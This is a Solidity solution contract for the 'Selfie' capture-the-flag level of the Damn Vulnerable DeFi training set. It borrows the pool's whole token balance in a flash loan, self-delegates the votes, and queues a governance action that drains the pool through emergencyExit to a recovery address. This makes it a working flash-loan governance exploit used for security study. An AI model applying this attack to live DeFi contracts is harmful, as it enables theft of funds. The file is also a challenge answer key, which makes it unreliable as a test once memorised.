// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";
import {console} from "forge-std/Test.sol";

contract Solution is IERC3156FlashBorrower {
    SimpleGovernance immutable governance;
    address immutable recovery;
    uint256 public actionId;

    constructor(SimpleGovernance _governance, address _recovery) payable {
        governance = _governance;
        recovery = _recovery;
    }

    function solve(SelfiePool pool, DamnValuableVotes token) external {
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        // get votes to queue action
        DamnValuableVotes(token).delegate(address(this));
        bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
        actionId = governance.queueAction(msg.sender, 0, data);
        DamnValuableVotes(token).approve(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
